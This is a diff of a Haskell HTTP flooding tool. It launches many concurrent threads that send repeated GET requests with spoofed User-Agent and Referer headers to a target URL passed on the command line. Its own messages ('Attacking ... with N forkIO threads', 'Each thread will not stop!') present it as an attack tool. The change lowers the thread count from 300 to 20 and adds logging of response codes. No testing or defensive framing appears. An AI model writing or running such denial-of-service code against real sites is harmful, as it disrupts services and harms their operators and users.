@@ -49,18 +49,20 @@ attack done times url =
       response <- simpleHTTP (getRequest url) {
           rqHeaders=[Header HdrUserAgent userAgent,
                      Header HdrReferer $ referer ++ "?q=" ++ q]}
-      putStrLn $ "jobs left: "  ++ (show times)
+      (x, y, z) <- getResponseCode response
+      putStrLn $ ("jobs left: "  ++ (show times) ++
+                  ", response code = " ++ show x ++ show y ++ show z)
       -- (fmap (take 100) . getResponseBody $ response) >>= putStrLn
       onDone
       
 
 main :: IO ()
 main = do
-  let nThreads = 300
+  let nThreads = 20
       nAttacks = 100
   done <- newEmptyMVar
   url:_ <- getArgs
-  putStrLn $ ("Attacking =" ++ url ++ " with "
+  putStrLn $ ("Attacking " ++ url ++ " with "
               ++ (show nThreads) ++ " forkIO threads.")
   putStrLn $ (if nAttacks == -1
               then "Each thread will not stop!"
